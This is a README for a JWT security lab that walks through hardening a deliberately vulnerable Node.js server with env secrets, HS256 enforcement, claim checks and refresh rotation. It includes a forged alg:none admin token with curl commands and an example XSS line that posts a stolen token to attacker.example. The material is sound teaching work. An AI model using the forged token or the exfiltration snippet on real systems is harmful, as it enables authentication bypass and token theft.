# JWT Hardening Lab (Detailed Walkthrough)

---

> **Persona:** Senior cybersecurity software engineer — this README explains what was changed, why those changes matter, and how to reproduce the assignment evidence (vulnerable demo → hardened server). The goal: harden a Node.js + Express + SQLite JWT lab so it follows secure authentication practices.

---

## Table of contents

* [Introduction](#introduction)
* [🧐 Vulnerabilities Identified and Addressed](#-vulnerabilities-identified-and-addressed)
* [🛡️ Security Hardening Steps Implemented in Detail](#-security-hardening-steps-implemented-in-detail)
* [🚀 How to Run](#-how-to-run)
* [💥 Demonstrating the 'alg:none' Attack](#-demonstrating-the-algnone-attack)
* [🕵️‍♂️ Traffic Analysis with Wireshark](#%EF%B8%8F-traffic-analysis-with-wireshark)
* [Notes, Assumptions & Limitations](#notes-assumptions--limitations)
* [Appendix: Useful Commands & Snippets](#appendix-useful-commands--snippets)

---

## Introduction

This project is a hands-on lab that demonstrates how to move from an intentionally vulnerable JWT-based Node.js server (`vuln-server.js`) to a hardened implementation (`secure-server.js`). The vulnerable server demonstrates common mistakes (hard-coded secrets, `alg: none` acceptance, long-lived tokens, storing tokens in `localStorage`). The hardened server implements secure patterns:

* Move secrets out of source code into `.env`
* Short-lived access tokens + refresh token rotation
* HttpOnly cookie storage for refresh tokens
* Verifying `iss`, `aud` and enforcing `HS256`
* Central `authMiddleware` as a single point of verification

This README documents the vulnerabilities, the fixes, how to reproduce attacks against the vulnerable server, and how to show they fail against the hardened server.

---

## 🧐 Vulnerabilities Identified and Addressed

For each vulnerability: **The Problem** and **The Solution**.

### 1. Hard-coded Secrets

**The Problem:**
`vuln-server.js` uses a hard-coded secret:

```js
const WEAK_SECRET = 'weak-secret';
```

Hard-coded secrets in source control are trivially discovered and reused to sign/forge tokens.

**The Solution:**
Secrets moved to environment variables and loaded with `dotenv`. Example variables:

```
ACCESS_TOKEN_SECRET
REFRESH_TOKEN_SECRET
```

Secrets should be generated with a secure generator (e.g. Node `crypto.randomBytes`, or `openssl rand -hex 32`) and **never** committed.

---

### 2. `alg:none` Vulnerability

**The Problem:**
`vuln-server.js` intentionally decodes and trusts unsigned tokens when the token header sets `"alg": "none"`. This allows attackers to craft a token with `{"alg":"none"}` and arbitrary payload (e.g., `role: "admin"`) to bypass signature verification.

**The Solution:**
The hardened server enforces allowed algorithms by using `jwt.verify(..., { algorithms: ['HS256'], issuer, audience })` — this rejects unsigned tokens and closes the `alg:none` attack vector.

---

### 3. Long-Lived Access Tokens

**The Problem:**
The vulnerable implementation issues long-lived access tokens (e.g., `expiresIn: '7d'`). Long-lived access tokens increase the risk window if a token is leaked.

**The Solution:**
Issue short-lived access tokens (recommended: 10–15 minutes). Use refresh tokens to obtain fresh access tokens instead of long-lived access tokens.

---

### 4. Insecure Token Storage (in `localStorage`)

**The Problem:**
Storing tokens in `localStorage` makes them accessible to JavaScript and therefore to XSS attacks. An attacker who executes JS in the page can read and exfiltrate tokens.

**The Solution:**
Store refresh tokens in **HttpOnly** cookies (not accessible to JS) and keep access tokens in memory (or in browser-only variables). This prevents theft of the refresh token via XSS. If the UI needs to persist login across refresh, use short-lived access tokens and rely on the HttpOnly refresh cookie for silent reauth.

---

### 5. Missing Claim Validation (`iss`, `aud`)

**The Problem:**
The vulnerable server did not set or verify `issuer` (`iss`) and `audience` (`aud`) claims. Missing claim checks make it simpler to replay/forge tokens meant for other services.

**The Solution:**
Include `issuer` and `audience` when issuing tokens and verify them when accepting tokens:

```js
jwt.sign(payload, ACCESS_SECRET, { issuer: TOKEN_ISSUER, audience: TOKEN_AUDIENCE, algorithm: 'HS256' })
jwt.verify(token, ACCESS_SECRET, { algorithms: ['HS256'], issuer: TOKEN_ISSUER, audience: TOKEN_AUDIENCE })
```

---

### 6. No Refresh Token Strategy

**The Problem:**
Either no refresh tokens existed, or refresh handling did not implement rotation or server-side checks, which can allow stolen refresh tokens to be reused indefinitely.

**The Solution:**
Implement Access + Refresh tokens:

* Access token: short-lived, used in `Authorization: Bearer`.
* Refresh token: long-lived, stored in **HttpOnly cookie**, identified by a `jti`, and tracked server-side in a refresh store (in-memory Map or persisted DB). When a refresh occurs, rotate tokens: invalidate the old `jti` and issue a new refresh token with a new `jti`. This prevents use-after-logout and allows revocation.

---

## 🛡️ Security Hardening Steps Implemented in Detail

Each sub-section explains the fixes and points to the code area (from `secure-server.js`).

### Externalizing Configuration with `.env`

**What we did:**

* Added `dotenv` to load environment configuration.
* Removed hard-coded secrets and constants.

**Why:**

* Keeps secrets out of source control.
* Allows different environments to use different credentials/config without code changes.

**Example `.env.example`:**

```
PORT=1235
ACCESS_TOKEN_SECRET=
REFRESH_TOKEN_SECRET=
TOKEN_ISSUER=jwt-lab-app
TOKEN_AUDIENCE=api.jwt-lab
ACCESS_TOKEN_EXPIRES=15m
REFRESH_TOKEN_EXPIRES=7d
```

**How to generate secrets:**

* Node: `node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"`
* OpenSSL: `openssl rand -hex 32`

*Store the generated hex strings in `.env` as `ACCESS_TOKEN_SECRET` and `REFRESH_TOKEN_SECRET`.*

---

### Implementing the Secure Token Pattern (Access + Refresh Tokens)

**Design:**

* **Access Token**: short-lived (e.g., `15m`), used for API calls, returned in JSON to the client, *not* persisted to `localStorage` (prefer memory).
* **Refresh Token**: long-lived (e.g., `7d`), stored in an **HttpOnly**, `SameSite` cookie — not accessible by JS. Server keeps a mapping of `jti` → owner and invalidates used `jti`s (rotation).

**Why HttpOnly cookie for refresh token matters:**
HttpOnly prevents JavaScript from reading the cookie value; thus even a successful XSS cannot directly steal the refresh token. This drastically reduces token theft risk.

**Example issuance (conceptual):**

```js
// access token (signed with ACCESS_SECRET)
const accessToken = jwt.sign(
  { sub: user.username, role: user.role },
  ACCESS_SECRET,
  { algorithm: 'HS256', expiresIn: '15m', issuer: TOKEN_ISSUER, audience: TOKEN_AUDIENCE }
);

// refresh token (signed with REFRESH_SECRET, includes jti)
const refreshTokenId = crypto.randomBytes(16).toString('hex');
const refreshToken = jwt.sign(
  { sub: user.username, jti: refreshTokenId },
  REFRESH_SECRET,
  { algorithm: 'HS256', expiresIn: '7d', issuer: TOKEN_ISSUER, audience: TOKEN_AUDIENCE }
);
refreshStore.set(refreshTokenId, { username: user.username });
res.cookie('refreshToken', refreshToken, { httpOnly: true, sameSite: 'Strict', secure: false, maxAge: 7*24*60*60*1000 });
res.json({ accessToken });
```

> **Note:** `secure: true` should be used in production when running over HTTPS. For local lab demos without HTTPS `secure` can be `false`.

---

### Building a Central Authentication Middleware

**What:** `authMiddleware` centralizes verification:

* Ensures `Authorization` header exists and follows `Bearer <token>`
* Verifies with `jwt.verify(token, ACCESS_SECRET, { algorithms: ['HS256'], issuer, audience })`
* Attaches `req.user = payload` for downstream handlers

**Why:**

* Single place to enforce claims, algorithms, expiration — reduces risk of inconsistent checks across endpoints.
* Explicitly enforces `HS256` (so `alg:none` and other algorithms are rejected).

**Example `authMiddleware` snippet:**

```js
function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }
  const token = authHeader.split(' ')[1];

  try {
    const payload = jwt.verify(token, ACCESS_SECRET, {
      algorithms: ['HS256'],
      issuer: TOKEN_ISSUER,
      audience: TOKEN_AUDIENCE
    });
    req.user = payload;
    next();
  } catch (err) {
    return res.status(401).json({ error: `Invalid or expired token: ${err.message}` });
  }
}
```

This middleware *prevents* unsigned tokens and tokens with missing/mismatched `iss`/`aud`.

---

### Correcting Authorization Logic in Token Refresh

**The subtle bug we fixed:**
A naive `/refresh` implementation issued a new access token using a hard-coded role (e.g., always `"user"`) — even if the original user was `admin`. This allows privilege downgrades or, if reversed, potential escalation.

**Fix implemented:**

* After validating the refresh token's `jti` and `sub`, the server queries the DB to get the current `role` for `sub` (username).
* The server then issues a new access token that includes the *actual role from the DB*.
* Also implement refresh token **rotation**: delete the old `jti` entry from `refreshStore` after use, and store the new `jti`.

**Why:**

* Ensures that the newly minted access token reflects the authoritative role stored in the database (prevents accidental/intentional privilege changes via refresh token misuse).
* Rotation prevents reuse of a stolen refresh token.

---

## 🚀 How to Run

These commands assume the project root contains the files: `vuln-server.js`, `secure-server.js`, `package.json`, `init-db.js`, and `users.db` (or `npm run init-db` will create it).

> **Important:** Do **not** commit a `.env` file with real secrets. Commit `.env.example` only.

### 1. Prerequisites

* Node.js v18+ (recommended)
* npm
* (Optional) sqlite3 client if you want to inspect the DB manually

### 2. Installation

```bash
git clone <repo-url>
cd <repo-directory>
npm install
```

### 3. Configuration

Create a `.env` file from `.env.example`:

```bash
cp .env.example .env
# then edit .env and set values
# Generate secrets with:
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
# paste outputs into ACCESS_TOKEN_SECRET and REFRESH_TOKEN_SECRET
```

Example `.env` (DO NOT COMMIT real secrets):

```
PORT=1235
ACCESS_TOKEN_SECRET=<paste generated hex>
REFRESH_TOKEN_SECRET=<paste generated hex>
TOKEN_ISSUER=jwt-lab-app
TOKEN_AUDIENCE=api.jwt-lab
ACCESS_TOKEN_EXPIRES=15m
REFRESH_TOKEN_EXPIRES=7d
```

### 4. Initialize the Database

If a DB initializer is provided:

```bash
npm run init-db
# or
node init-db.js
```

This creates `users.db` and example users with hashed passwords.

### 5. Run the Servers

We recommend adding scripts to `package.json` like:

```json
"scripts": {
  "start-vuln": "node vuln-server.js",
  "start-secure": "node secure-server.js",
  "init-db": "node init-db.js"
}
```

Run the vulnerable server:

```bash
npm run start-vuln
# Vuln server default: http://localhost:1234
```

Run the hardened secure server (use a different port, e.g. 1235):

```bash
npm run start-secure
# Secure server default: http://localhost:1235
```

---

## 💥 Demonstrating the 'alg:none' Attack

Below are concrete reproduction steps used in the lab.

### 1. Attacking the Vulnerable Server (Successful ✅)

**Why this works on `vuln-server.js`:**
`vuln-server.js` reads the token header and intentionally accepts tokens where `header.alg === 'none'`. It decodes the payload and trusts it without verifying a signature.

**Craft unsigned token (for demo)**

* Header: `{"alg":"none"}`
* Payload: `{"sub":"admin","role":"admin"}`
* Token (base64url header + "." + base64url payload + "."):

```
eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJhZG1pbiJ9.
```

**curl to call the vulnerable `/admin` (port 1234):**

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJhZG1pbiJ9." http://localhost:1234/admin
```

**Expected result (vulnerable server):**

* Returns `200` with `VERY SENSITIVE ADMIN DATA (ACCESSED VIA alg:none DEMO)` because the server decodes and trusts the payload.

---

### 2. Attacking the Hardened Server (Fails ❌)

**Same curl, different port (secure server at 1235):**

```bash
curl -i -H "Authorization: Bearer eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAicm9sZSI6ICJhZG1pbiJ9." http://localhost:1235/admin
```

**Why it fails on `secure-server.js`:**

* `authMiddleware` calls `jwt.verify()` with `algorithms: ['HS256']` and checks `issuer` and `audience`. The token with `alg:none` is unsigned and fails verification. The server returns `401 Invalid or expired token` (or similar), preventing access.

---

## 🕵️‍♂️ Traffic Analysis with Wireshark

Follow these steps to capture network traffic and inspect tokens for the assignment evidence:

### Capture steps (example for local testing)

1. **Open Wireshark** (run as admin if needed).
2. **Select the interface**:

   * On Linux: `lo` (loopback).
   * On macOS: `lo0` or `Loopback`.
   * On Windows (Npcap installed): `Npcap Loopback Adapter`.
3. **Start capture** on the chosen interface before issuing requests.

### Filter the traffic

* To see HTTP traffic on the vulnerable server port (1234):

  ```
  http && tcp.port == 1234
  ```
* Generic filter for port:

  ```
  tcp.port == 1234 || tcp.port == 1235
  ```
* To find the `Authorization` header in HTTP:

  * Stop the capture then right-click a packet → Follow → HTTP Stream
  * Or use `http` display filter then inspect packet details → `Hypertext Transfer Protocol` → `Authorization`

### What you will observe (HTTP)

* **Authorization header is visible in plain text** inside HTTP requests (e.g., `Authorization: Bearer <token>`).
* The payloads (JWTs) are readable — both header and payload base64 parts are visible.

### Why HTTPS is mandatory

* Over HTTP, anybody on the network (or on the same machine if capture accessible) can view tokens in plain text.
* With HTTPS (TLS), the Authorization header and token are inside an encrypted TCP stream; Wireshark will show TLS handshake messages and encrypted application data — token contents will not be visible.
* **Conclusion:** Always use HTTPS in production. For a local bonus, you can run the secure server with a self-signed certificate and demonstrate that Wireshark can no longer view the token payload in cleartext.

---

## Notes, Assumptions & Limitations

* `.env.example` is included. **Do not** commit `.env` with real secrets.
* For local demos without HTTPS, `secure` flag in cookies is set to `false`. In production over HTTPS, set `secure: true`.
* The refresh-store used in the lab is an in-memory Map (`refreshStore`) for rotation demo. For persistence across restarts, implement a DB-backed store (bonus requirement).
* Rate limiting and helmet (secure headers) are recommended for production (bonus tasks).
* The lab keeps the supplied frontend; only minor client edits may be necessary (e.g., `fetch(..., { credentials: 'include' })` for cookie refresh flow).

---

## Appendix: Useful Commands & Snippets

### Generate secure secrets

```bash
# Node
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# OpenSSL
openssl rand -hex 32
```

### Example curl to login (adjust according to your endpoints)

```bash
curl -i -X POST http://localhost:1235/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}'
```

### Example code snippets used in `secure-server.js`

**authMiddleware**

```js
const jwt = require('jsonwebtoken');

function authMiddleware(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }
  const token = authHeader.split(' ')[1];

  try {
    const payload = jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, {
      algorithms: ['HS256'],
      issuer: process.env.TOKEN_ISSUER,
      audience: process.env.TOKEN_AUDIENCE
    });
    req.user = payload;
    next();
  } catch (err) {
    return res.status(401).json({ error: `Invalid or expired token: ${err.message}` });
  }
}
```

**Refresh rotation sketch**

```js
// refreshStore is a Map of jti -> { username, createdAt }
const refreshStore = new Map();

app.post('/refresh', (req, res) => {
  const token = req.cookies.refreshToken;
  if (!token) return res.status(401).json({ error: 'No refresh token' });

  let payload;
  try {
    payload = jwt.verify(token, process.env.REFRESH_TOKEN_SECRET, {
      algorithms: ['HS256'],
      issuer: process.env.TOKEN_ISSUER,
      audience: process.env.TOKEN_AUDIENCE
    });
  } catch (err) {
    return res.status(401).json({ error: 'Invalid refresh token' });
  }

  // Check jti in refreshStore
  if (!refreshStore.has(payload.jti)) {
    return res.status(401).json({ error: 'Refresh token not recognized' });
  }

  // Fetch authoritative role from DB
  DB.get("SELECT role FROM users WHERE username = ?", [payload.sub], (err, row) => {
    if (err || !row) return res.status(401).json({ error: 'User not found' });

    // Rotate: delete old jti, create new one
    refreshStore.delete(payload.jti);
    const newJti = crypto.randomBytes(16).toString('hex');
    const newRefreshToken = jwt.sign({ sub: payload.sub, jti: newJti }, process.env.REFRESH_TOKEN_SECRET, {
      algorithm: 'HS256',
      expiresIn: process.env.REFRESH_TOKEN_EXPIRES,
      issuer: process.env.TOKEN_ISSUER,
      audience: process.env.TOKEN_AUDIENCE
    });
    refreshStore.set(newJti, { username: payload.sub });

    const newAccessToken = jwt.sign({ sub: payload.sub, role: row.role }, process.env.ACCESS_TOKEN_SECRET, {
      algorithm: 'HS256',
      expiresIn: process.env.ACCESS_TOKEN_EXPIRES,
      issuer: process.env.TOKEN_ISSUER,
      audience: process.env.TOKEN_AUDIENCE
    });

    res.cookie('refreshToken', newRefreshToken, { httpOnly: true, sameSite: 'Strict', secure: false, maxAge: 7*24*60*60*1000 });
    res.json({ accessToken: newAccessToken });
  });
});
```

### Example: Showing how `localStorage` token theft happens (don’t run on production)

In a vulnerable app that stores a token in `localStorage`, an XSS payload could read:

```js
// attacker JS injected via XSS
fetch('https://attacker.example/exfil', {
  method: 'POST',
  body: localStorage.getItem('token')
});
```

This demonstrates why `localStorage` is unsafe for long-lived secrets. Use HttpOnly cookies for refresh tokens and keep access tokens short-lived and preferably in memory.

---

